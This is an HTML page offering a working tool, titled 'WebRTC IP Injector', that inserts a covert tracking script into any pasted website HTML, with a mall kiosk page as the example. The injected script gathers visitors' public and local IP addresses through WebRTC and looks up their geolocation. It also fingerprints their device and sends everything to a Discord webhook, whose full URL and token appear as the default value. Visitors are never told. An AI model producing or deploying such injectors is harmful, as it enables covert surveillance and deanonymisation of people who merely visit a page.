<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebRTC IP Injector - Custom Webhook</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0e27;font-family:monospace;padding:16px;}
        .box{max-width:1400px;margin:0 auto;}
        .bar{background:#1a1f3a;padding:12px 16px;border-radius:8px;margin-bottom:16px;display:flex;gap:12px;flex-wrap:wrap;align-items:center;}
        input, .webhook-input{background:#0d0f23;border:1px solid #2a2f4f;color:#fff;padding:8px 12px;border-radius:6px;flex:1;min-width:200px;}
        .webhook-row{background:#1a1f3a;padding:12px 16px;border-radius:8px;margin-bottom:16px;display:flex;gap:12px;flex-wrap:wrap;align-items:center;}
        button{background:#4a3ab5;color:#fff;border:none;padding:8px 18px;border-radius:6px;cursor:pointer;font-weight:bold;}
        button:hover{background:#5a4ac5;}
        .copy{background:#2a5f3a;}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
        .panel{background:#11152f;border-radius:8px;border:1px solid #2a2f4f;}
        .panel h3{background:#1a1f3a;padding:10px 14px;color:#8b9dff;border-bottom:1px solid #2a2f4f;}
        textarea{width:100%;height:520px;background:#0d0f23;border:none;color:#b8c7ff;font-family:monospace;font-size:12px;padding:12px;resize:vertical;}
        .status{margin-top:12px;padding:10px;border-radius:6px;display:none;}
        .status.ok{background:#1a3a2a;color:#6fcf97;display:block;}
        .status.bad{background:#3a1a1a;color:#e74c3c;display:block;}
        .info{background:#1a1f3a;padding:8px 12px;border-radius:6px;margin-top:16px;font-size:12px;color:#6b7bb5;}
        @media(max-width:800px){.grid{grid-template-columns:1fr;}}
    </style>
</head>
<body>
<div class="box">
    <div class="bar">
        <span style="color:#8b9dff;">🏷️ LABEL:</span>
        <input type="text" id="labelInp" value="Mall_Kiosk_1">
        <button id="injectBtn">⚡ INJECT WebRTC</button>
        <button id="copyBtn" class="copy">📋 COPY</button>
    </div>
    <div class="webhook-row">
        <span style="color:#8b9dff;">🔗 WEBHOOK URL:</span>
        <input type="text" id="webhookInp" class="webhook-input" placeholder="https://discord.com/api/webhooks/..." value="https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds">
    </div>
    <div class="grid">
        <div class="panel">
            <h3>📥 YOUR HTML</h3>
            <textarea id="inputHtml" placeholder="Paste website HTML here..."></textarea>
        </div>
        <div class="panel">
            <h3>📤 OUTPUT (COPY THIS)</h3>
            <textarea id="outputHtml" readonly style="background:#0a0c1f;" placeholder="Click INJECT"></textarea>
        </div>
    </div>
    <div id="status" class="status"></div>
    <div class="info">
        📡 <strong>WebRTC captures:</strong> Public IP • Local IP • All network interfaces • Device fingerprint<br>
        💡 Custom webhook URL will be embedded in the injected script
    </div>
</div>

<script>
function getTracker(label, webhook) {
    let cleanLabel = label.replace(/\\/g,'\\\\').replace(/"/g,'\\"');
    let cleanWebhook = webhook.replace(/\\/g,'\\\\').replace(/"/g,'\\"');
    
    return '\n<!-- WEBRTC IP TRACKER -->\n<script>\n(function(){\n    const LABEL="' + cleanLabel + '", WEBHOOK="' + cleanWebhook + '", TS=new Date().toISOString(), URL=location.href, TITLE=document.title, REF=document.referrer||"direct";\n    \n    function getIPsFromWebRTC(callback) {\n        let ips = { local: [], public: [], all: [] };\n        try {\n            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] });\n            pc.createDataChannel("");\n            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(e => {});\n            pc.onicecandidate = (e) => {\n                if(e.candidate) {\n                    let c = e.candidate.candidate;\n                    let m = c.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/g);\n                    if(m) m.forEach(ip => {\n                        if(!ips.all.includes(ip) && ip !== "0.0.0.0") {\n                            ips.all.push(ip);\n                            if(ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.") || ip === "127.0.0.1") {\n                                ips.local.push(ip);\n                            } else {\n                                ips.public.push(ip);\n                            }\n                        }\n                    });\n                }\n            };\n            pc.onicegatheringstatechange = () => {\n                if(pc.iceGatheringState === "complete") {\n                    pc.close();\n                    callback(ips);\n                }\n            };\n            setTimeout(() => { pc.close(); callback(ips); }, 2500);\n        } catch(e) { callback(ips); }\n    }\n    \n    async function getPublicIPFallback() {\n        try {\n            let res = await fetch("https://api.ipify.org?format=json");\n            let data = await res.json();\n            return data.ip;\n        } catch(e) { return null; }\n    }\n    \n    async function getGeo(ip) {\n        try {\n            let res = await fetch(`https://ipapi.co/${ip}/json/`);\n            return await res.json();\n        } catch(e) { return null; }\n    }\n    \n    function getDevice() {\n        return {\n            ua: navigator.userAgent,\n            platform: navigator.platform,\n            lang: navigator.language,\n            screen: screen.width + "x" + screen.height,\n            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,\n            cores: navigator.hardwareConcurrency || "unknown"\n        };\n    }\n    \n    getIPsFromWebRTC(async function(ips) {\n        let publicIP = ips.public.length > 0 ? ips.public[0] : await getPublicIPFallback();\n        let geo = publicIP ? await getGeo(publicIP) : null;\n        let device = getDevice();\n        \n        let fields = [\n            {name: "🌐 Public IP", value: publicIP || "unknown", inline: true},\n            {name: "🏠 Local IPs", value: ips.local.join(", ") || "none", inline: true},\n            {name: "📍 Location", value: geo ? (geo.city + ", " + geo.region + ", " + geo.country_name) : "unknown", inline: true},\n            {name: "📱 Device", value: device.ua.substring(0, 70), inline: false},\n            {name: "💻 Specs", value: device.platform + " | " + device.screen + " | " + device.cores + " cores", inline: false},\n            {name: "🌙 Timezone", value: device.tz, inline: true},\n            {name: "🏷️ Kiosk", value: LABEL, inline: true},\n            {name: "⏱️ Time", value: TS, inline: true},\n            {name: "🔗 Page", value: URL.substring(0, 80), inline: false}\n        ];\n        \n        let embed = { title: "📍 VISITOR - " + LABEL, color: 0xff4444, fields: fields, footer: { text: "WebRTC IP Capture" } };\n        \n        try {\n            await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [embed], username: "WebRTC_Tracker" }) });\n        } catch(e) { console.error(e); }\n    });\n})();\n<\/script>\n<!-- END WEBRTC TRACKER -->\n';\n}

function inject(html, label, webhook) {
    if(!html.trim()) throw new Error("Paste HTML");
    if(!label.trim()) throw new Error("Enter label");
    if(!webhook.trim()) throw new Error("Enter webhook URL");
    let script = getTracker(label, webhook);
    if(html.indexOf('</body>')>-1) return html.replace('</body>', script+'\n</body>');
    if(html.indexOf('</html>')>-1) return html.replace('</html>', script+'\n</html>');
    return html + '\n' + script;
}

let inputArea = document.getElementById('inputHtml');
let outputArea = document.getElementById('outputHtml');
let labelInp = document.getElementById('labelInp');
let webhookInp = document.getElementById('webhookInp');
let injectBtn = document.getElementById('injectBtn');
let copyBtn = document.getElementById('copyBtn');
let statusDiv = document.getElementById('status');

inputArea.value = '<!DOCTYPE html>\n<html>\n<head><title>Mall Kiosk</title></head>\n<body>\n<h1>Welcome to Grand Mall</h1>\n<p>Interactive Directory</p>\n</body>\n</html>';

injectBtn.onclick = () => {
    try {
        let result = inject(inputArea.value, labelInp.value, webhookInp.value);
        outputArea.value = result;
        statusDiv.className = 'status ok';
        statusDiv.textContent = '✅ WebRTC Tracker Injected! Custom webhook embedded.';
        setTimeout(() => statusDiv.className = 'status', 2500);
    } catch(e) {
        statusDiv.className = 'status bad';
        statusDiv.textContent = '❌ ' + e.message;
        setTimeout(() => statusDiv.className = 'status', 2500);
    }
};

copyBtn.onclick = async () => {
    let code = outputArea.value;
    if(!code || code.trim()==="") {
        statusDiv.className = 'status bad';
        statusDiv.textContent = '❌ Nothing to copy';
        setTimeout(() => statusDiv.className = 'status', 1500);
        return;
    }
    try {
        await navigator.clipboard.writeText(code);
        statusDiv.className = 'status ok';
        statusDiv.textContent = '📋 COPIED!';
        setTimeout(() => statusDiv.className = 'status', 1500);
    } catch(e) {
        outputArea.select();
        document.execCommand('copy');
        statusDiv.className = 'status ok';
        statusDiv.textContent = '📋 COPIED!';
        setTimeout(() => statusDiv.className = 'status', 1500);
    }
};
</script>
</body>
</html>
